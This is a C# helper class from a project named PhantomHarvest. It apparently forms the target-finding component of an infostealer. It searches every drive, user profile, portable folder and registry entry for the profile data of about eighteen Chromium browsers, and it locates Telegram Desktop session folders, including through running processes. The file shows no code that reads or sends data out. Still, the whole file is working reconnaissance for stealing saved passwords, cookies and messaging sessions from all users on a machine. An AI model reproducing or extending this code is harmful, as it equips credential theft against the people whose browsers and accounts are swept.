using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Win32;

namespace PhantomHarvest.Helper
{
	// 路径发现辅助类 - 用于在多个驱动器和位置查找应用程序
	internal class PathDiscovery
	{
		/// <summary>
		/// 获取所有固定驱动器（C:\, D:\, E:\ 等）
		/// </summary>
		public static List<string> GetAllFixedDrives()
		{
			List<string> drives = new List<string>();
			try
			{
				foreach (DriveInfo drive in DriveInfo.GetDrives())
				{
					if (drive.DriveType == DriveType.Fixed && drive.IsReady)
					{
						drives.Add(drive.RootDirectory.FullName);
					}
				}
			}
			catch { }
			return drives;
		}

		/// <summary>
		/// 在所有驱动器中搜索相对路径
		/// 例如: "Users\\{Username}\\AppData\\Local\\Google\\Chrome\\User Data"
		/// </summary>
		public static List<string> SearchAllDrives(string relativePath)
		{
			List<string> foundPaths = new List<string>();
			List<string> drives = GetAllFixedDrives();

			foreach (string drive in drives)
			{
				try
				{
					string fullPath = Path.Combine(drive, relativePath);
					if (Directory.Exists(fullPath))
					{
						foundPaths.Add(fullPath);
					}
				}
				catch { }
			}

			return foundPaths;
		}

		/// <summary>
		/// 从注册表获取浏览器安装路径
		/// </summary>
		public static string GetBrowserPathFromRegistry(string browserName)
		{
			try
			{
				string[] registryPaths = new string[]
				{
					// Chrome/Edge/Brave 等
					"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserName + ".exe",
					"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserName + ".exe",
					// 卸载信息
					"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
					"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
				};

				foreach (string regPath in registryPaths)
				{
					using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath))
					{
						if (key != null)
						{
							if (regPath.Contains("App Paths"))
							{
								string exePath = key.GetValue("") as string;
								if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
								{
									return Path.GetDirectoryName(exePath);
								}
							}
							else if (regPath.Contains("Uninstall"))
							{
								// 遍历卸载条目
								foreach (string subKeyName in key.GetSubKeyNames())
								{
									using (RegistryKey subKey = key.OpenSubKey(subKeyName))
									{
										if (subKey != null)
										{
											string displayName = subKey.GetValue("DisplayName") as string;
											if (!string.IsNullOrEmpty(displayName) && displayName.ToLower().Contains(browserName.ToLower()))
											{
												string installLocation = subKey.GetValue("InstallLocation") as string;
												if (!string.IsNullOrEmpty(installLocation) && Directory.Exists(installLocation))
												{
													return installLocation;
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			catch { }
			return null;
		}

		/// <summary>
		/// 获取所有可能的Chromium浏览器User Data路径
		/// 返回: Dictionary<BrowserName, List<UserDataPath>>
		/// </summary>
		public static Dictionary<string, List<string>> GetAllChromiumPaths()
		{
			Dictionary<string, List<string>> browserPaths = new Dictionary<string, List<string>>();

			// 定义浏览器和其默认相对路径
			Dictionary<string, string[]> browserConfigs = new Dictionary<string, string[]>
			{
				{ "Chrome", new[] { "Google\\Chrome\\User Data", "ChromePlus\\User Data" } },
				{ "Edge", new[] { "Microsoft\\Edge\\User Data" } },
				{ "Brave", new[] { "BraveSoftware\\Brave-Browser\\User Data" } },
				{ "CocCoc", new[] { "CocCoc\\Browser\\User Data" } },
				{ "Torch", new[] { "Torch\\User Data" } },
				{ "Kometa", new[] { "Kometa\\User Data" } },
				{ "Orbitum", new[] { "Orbitum\\User Data" } },
				{ "CentBrowser", new[] { "CentBrowser\\User Data" } },
				{ "7Star", new[] { "7Star\\7Star\\User Data" } },
				{ "Sputnik", new[] { "Sputnik\\Sputnik\\User Data" } },
				{ "Epic Privacy Browser", new[] { "Epic Privacy Browser\\User Data" } },
				{ "Uran", new[] { "uCozMedia\\Uran\\User Data" } },
				{ "Yandex", new[] { "Yandex\\YandexBrowser\\User Data" } },
				{ "Iridium", new[] { "Iridium\\User Data" } },
				{ "Opera", new[] { "Opera Software\\Opera Stable" } },
				{ "Opera GX", new[] { "Opera Software\\Opera GX Stable" } },
				{ "Vivaldi", new[] { "Vivaldi\\User Data" } },
				{ "QQBrowser", new[] { "Tencent\\QQBrowser\\User Data" } }
			};

			foreach (var browserConfig in browserConfigs)
			{
				string browserName = browserConfig.Key;
				List<string> foundPaths = new List<string>();

				// 1. 检查默认位置（当前用户 LocalAppData/AppData）
				foreach (string relPath in browserConfig.Value)
				{
					// LocalApplicationData（大多数浏览器）
					string localPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), relPath);
					if (Directory.Exists(localPath) && !foundPaths.Contains(localPath))
					{
						foundPaths.Add(localPath);
					}

					// ApplicationData（Opera等）
					string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), relPath);
					if (Directory.Exists(appDataPath) && !foundPaths.Contains(appDataPath))
					{
						foundPaths.Add(appDataPath);
					}
				}

				// 2. 在所有驱动器搜索
				List<string> drives = GetAllFixedDrives();
				foreach (string drive in drives)
				{
					foreach (string relPath in browserConfig.Value)
					{
						try
						{
							// 搜索 X:\Users\*\AppData\Local\{browser}
							string usersPath = Path.Combine(drive, "Users");
							if (Directory.Exists(usersPath))
							{
								foreach (string userDir in Directory.GetDirectories(usersPath))
								{
									string localAppData = Path.Combine(userDir, "AppData", "Local", relPath);
									if (Directory.Exists(localAppData) && !foundPaths.Contains(localAppData))
									{
										foundPaths.Add(localAppData);
									}

									string appData = Path.Combine(userDir, "AppData", "Roaming", relPath);
									if (Directory.Exists(appData) && !foundPaths.Contains(appData))
									{
										foundPaths.Add(appData);
									}
								}
							}

							// 搜索便携版: X:\PortableApps\{browser}
							string portablePath1 = Path.Combine(drive, "PortableApps", browserName, "User Data");
							if (Directory.Exists(portablePath1) && !foundPaths.Contains(portablePath1))
							{
								foundPaths.Add(portablePath1);
							}

							// X:\{browser}\User Data
							string portablePath2 = Path.Combine(drive, browserName, "User Data");
							if (Directory.Exists(portablePath2) && !foundPaths.Contains(portablePath2))
							{
								foundPaths.Add(portablePath2);
							}
						}
						catch { }
					}
				}

				// 3. 从注册表获取（如果有）
				string regPath = GetBrowserPathFromRegistry(browserName);
				if (!string.IsNullOrEmpty(regPath))
				{
					// 注册表返回的是exe路径，需要找到User Data
					foreach (string relPath in browserConfig.Value)
					{
						// 尝试相对于exe的位置
						string userDataPath = Path.Combine(regPath, "User Data");
						if (Directory.Exists(userDataPath) && !foundPaths.Contains(userDataPath))
						{
							foundPaths.Add(userDataPath);
						}
					}
				}

				if (foundPaths.Count > 0)
				{
					browserPaths[browserName] = foundPaths;
				}
			}

			return browserPaths;
		}

		/// <summary>
		/// 查找Telegram的所有可能路径
		/// </summary>
		public static List<string> FindTelegramPaths()
		{
			List<string> foundPaths = new List<string>();

			// 1. 默认位置
			string defaultPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
			if (Directory.Exists(defaultPath))
			{
				foundPaths.Add(defaultPath);
			}

			// 2. 所有驱动器搜索
			List<string> drives = GetAllFixedDrives();
			foreach (string drive in drives)
			{
				try
				{
					// X:\Users\*\AppData\Roaming\Telegram Desktop
					string usersPath = Path.Combine(drive, "Users");
					if (Directory.Exists(usersPath))
					{
						foreach (string userDir in Directory.GetDirectories(usersPath))
						{
							string telegramPath = Path.Combine(userDir, "AppData", "Roaming", "Telegram Desktop");
							if (Directory.Exists(telegramPath) && !foundPaths.Contains(telegramPath))
							{
								foundPaths.Add(telegramPath);
							}
						}
					}

					// Portable版本: X:\Telegram
					string portablePath1 = Path.Combine(drive, "Telegram");
					if (Directory.Exists(portablePath1) && !foundPaths.Contains(portablePath1))
					{
						foundPaths.Add(portablePath1);
					}

					// X:\PortableApps\Telegram
					string portablePath2 = Path.Combine(drive, "PortableApps", "Telegram");
					if (Directory.Exists(portablePath2) && !foundPaths.Contains(portablePath2))
					{
						foundPaths.Add(portablePath2);
					}

					// X:\Telegram Desktop
					string portablePath3 = Path.Combine(drive, "Telegram Desktop");
					if (Directory.Exists(portablePath3) && !foundPaths.Contains(portablePath3))
					{
						foundPaths.Add(portablePath3);
					}
				}
				catch { }
			}

			// 3. 从正在运行的进程获取
			try
			{
				System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("Telegram");
				foreach (var proc in processes)
				{
					try
					{
						string exePath = proc.MainModule.FileName;
						string dir = Path.GetDirectoryName(exePath);
						if (!string.IsNullOrEmpty(dir) && Directory.Exists(dir) && !foundPaths.Contains(dir))
						{
							foundPaths.Add(dir);
						}
					}
					catch { }
				}
			}
			catch { }

			return foundPaths;
		}
	}
}
